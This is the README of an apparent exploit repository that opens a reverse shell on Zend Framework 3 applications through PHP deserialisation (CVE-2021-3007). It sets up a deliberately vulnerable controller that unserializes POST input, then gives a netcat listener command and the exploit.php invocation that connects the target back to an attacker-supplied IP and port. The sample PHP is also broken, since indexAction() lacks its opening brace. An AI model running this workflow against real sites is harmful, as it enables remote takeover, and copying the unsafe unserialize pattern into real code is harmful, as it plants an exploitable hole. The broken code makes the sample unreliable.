# deserial-killer-zf3

Zend Framework 3 deserialisation reverse shell based on CVE-2021-3007 and Ling-Yizhous PoC at https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md

## Test Environment

composer create-project zendframework/skeleton-application

Update module/Application/src/Controller/IndexController.php to something like this:

```php
<?php
/**
 * @link      http://github.com/zendframework/ZendSkeletonApplication for the canonical source repository
 * @copyright Copyright (c) 2005-2016 Zend Technologies USA Inc. (http://www.zend.com)
 * @license   http://framework.zend.com/license/new-bsd New BSD License
 */

// curl -X POST <your url> -d 'user=O:4:"User":1:{s:4:"name";s:3:"asd";}'

namespace{

  class User{
    public $name;
  }
}

namespace Application\Controller{

  use Zend\Mvc\Controller\AbstractActionController;
  use Zend\View\Model\ViewModel;

  class IndexController extends AbstractActionController
  {
      public function indexAction()
          $user=unserialize($this->params()->fromPost('user'));
          die("hello {$user->name}");
          return new ViewModel();
      }
   }
}
```
You can test it by running the curl commented in the code fragment above and you will get the message "hello asd".

## Exploitation
* Set up a netcat listner(e.g. nc -vlp 8888)
* Run exploit.php either with exec permissions or via php php with the following command line:
```bash
./exploit.php http://url.to.attack netcat-ip-address  netcat-port post-parameter-to-attack 
```
E.G. With the demo running on localhost (where the post parameter is user)
```sh
./exploit.php http://localhost:8080 127.0.0.1 8888 user
```
